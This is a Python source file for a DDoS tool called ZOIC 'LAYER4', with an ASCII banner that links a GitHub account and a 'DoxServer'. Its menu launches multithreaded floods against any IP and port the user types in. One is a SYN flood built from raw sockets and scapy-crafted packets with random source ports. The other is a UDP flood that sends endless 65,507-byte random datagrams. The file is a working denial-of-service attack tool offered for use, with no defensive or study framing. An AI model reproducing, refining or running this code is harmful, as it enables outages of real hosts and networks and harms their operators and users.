import os
import sys
import socket
import random
import threading
import time
from scapy.all import IP, TCP

zoic = "\033[38;5;118m"
white = "\033[97m"
red = "\033[38;5;196m"
green = "\033[38;5;34m"
clear = "\033[0m"

def logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{zoic}
██╗      █████╗ ██╗   ██╗███████╗██████╗     ██╗  ██╗
██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗    ██║  ██║
██║     ███████║ ╚████╔╝ █████╗  ██████╔╝    ███████║
██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗    ╚════██║
███████╗██║  ██║   ██║   ███████╗██║  ██║         ██║
╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝         ╚═╝{clear}
               
╔═════════════════════════════════════════════════════╗
║ {zoic}*{clear} Github    {zoic}:{clear}   https://github.com/madanokr001      ║
║ {zoic}*{clear} DoxServer {zoic}:{clear}   https://rvlt.gg/PnjMbQwH            ║
║ {zoic}*{clear} version   {zoic}:{clear}   4.0                                 ║
║ {zoic}*{clear} ZOIC      {zoic}:{clear}   {zoic}[{clear}{white}LAYER4{clear}{zoic}]{clear}                            ║  
╚═════════════════════════════════════════════════════╝
          
╔═════════════════════════════════════════════════════╗
║ {zoic}[{clear}1{zoic}]{clear} SYN Flood Attack                                ║
║ {zoic}[{clear}2{zoic}]{clear} UDP Flood Attack                                ║                       
║ {zoic}[{clear}3{zoic}]{clear} Exit ZOIC                                       ║                                 
╚═════════════════════════════════════════════════════╝  
""")
    
def layer4():
    while True:
        logo()
        select = input(f"""
╔═══[{zoic}root{clear}@{zoic}ZOIC{clear}]
╚══{zoic}>{clear} """)
                                        
        if select == "1" or select.lower() == "s":
            def send_packet(target, port):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

                    while True:
                        sport = random.randint(1024, 65535)
                        seq = random.randint(0, 4294967295)

                        ip_header = IP(dst=target)
                        tcp_header = TCP(sport=sport, dport=port, flags='S', seq=seq)

                        packet = bytes(ip_header / tcp_header)
                        print(f"[{zoic}ZOIC{clear}] IP Address {zoic}:{clear} {target} {zoic}|{clear} SYN Packet {white}:{clear} {zoic}{ip_header / tcp_header}{clear}")
                        s.sendto(packet, (target, port)) 

                except Exception as e:
                    print(f"[{red}WARNING{clear}] Download {zoic}>{clear} https://npcap.com/#download")
                    time.sleep(3)
                    print(f"{red}......................ERROR......................{clear}")
                    time.sleep(2)
                    
                finally:
                    s.close()

            def start_threads(target, port, threads):
                thread_list = []

                for i in range(threads):
                    t = threading.Thread(target=send_packet, args=(target, port))
                    thread_list.append(t)
                    t.start()

                for t in thread_list:
                    t.join()

            target = input(f"[{zoic}ZOIC{clear}] IP       {zoic}>{clear} ")
            port = int(input(f"[{zoic}ZOIC{clear}] PORT       {zoic}>{clear} "))
            threads = int(input(f"[{zoic}ZOIC{clear}] THREAD       {zoic}>{clear} "))
            start_threads(target, port, threads)


        elif select == "2" or select.lower() == "u":
            def send_packet(target, port):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

                    while True:
                        sport = random.randint(1024, 65535)  
                        data = random.randbytes(65507)  

                        s.sendto(data, (target, port))

                        print(f"[{zoic}ZOIC{clear}] IP Address {zoic}:{clear} {target} {zoic}|{clear} UDP Packet {zoic}:{clear} {white}65507{clear}")

                except Exception as e:
                    print(f"{red}......................ERROR......................{clear}")
                    time.sleep(3)
                finally:
                    s.close()

            def start_threads(target, port, threads):
                thread_list = []

                for i in range(threads):
                    t = threading.Thread(target=send_packet, args=(target, port))
                    thread_list.append(t)
                    t.start()

                for t in thread_list:
                    t.join()

            target = input(f"[{zoic}ZOIC{clear}] IP       {zoic}>{clear} ")
            port = int(input(f"[{zoic}ZOIC{clear}] PORT       {zoic}>{clear} "))
            threads = int(input(f"[{zoic}ZOIC{clear}] THREAD       {zoic}>{clear} "))
            start_threads(target, port, threads)

        elif select == "3" or select.lower() == "e":
            sys.exit()


if __name__ == "__main__":
    layer4()

